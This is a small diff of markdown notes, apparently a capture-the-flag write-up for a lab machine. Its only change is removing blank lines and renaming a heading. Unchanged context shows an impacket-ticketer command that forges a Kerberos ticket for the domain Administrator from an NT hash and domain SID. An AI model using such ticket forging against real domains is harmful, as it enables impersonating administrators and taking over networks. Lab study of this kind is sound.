@@ -238,9 +238,7 @@ impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-
 nonexistent/DC.SEQUEL.HTB Administrator
 ```
 
-
-
-### TST
+### TSA
 
 ![[Pasted image 20240329171828.png]]
 
